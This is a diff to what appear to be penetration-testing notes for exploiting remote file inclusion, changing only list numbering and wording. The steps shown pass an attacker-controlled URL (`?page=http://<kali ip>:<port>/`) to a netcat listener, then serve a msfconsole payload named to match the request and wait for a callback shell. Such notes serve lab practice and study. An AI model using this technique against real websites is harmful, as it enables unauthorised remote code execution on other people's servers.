@@ -30,13 +30,13 @@
 
    b. use website to call back to nc listener `<url>/?page=http://<kali ip>:<port>/`
 
-2. . examine nc output
+2. examine nc output
 
          i. if the request looks like `GET / HTTP/1.0` then the webpage is not looking for any file type inparticulat
 
          ii. if the tequest looks like `GET /<file name> HTTP/1.0` then it is looking for a file with that file name
 
-   d. request like `GET / HTTP/1.0`:
+   a. for request like `GET / HTTP/1.0`:
 
          i. create payload with msfconsol and start a webserver in that location
 
@@ -46,7 +46,7 @@
 
          iv. wait for the call back
 
-   e. request like `GET /<file name> HTTP/1.0`:
+   b. for request like `GET /<file name> HTTP/1.0`:
 
          i. create payload with msfconsol and with the name and file type of the one that nc returned
 
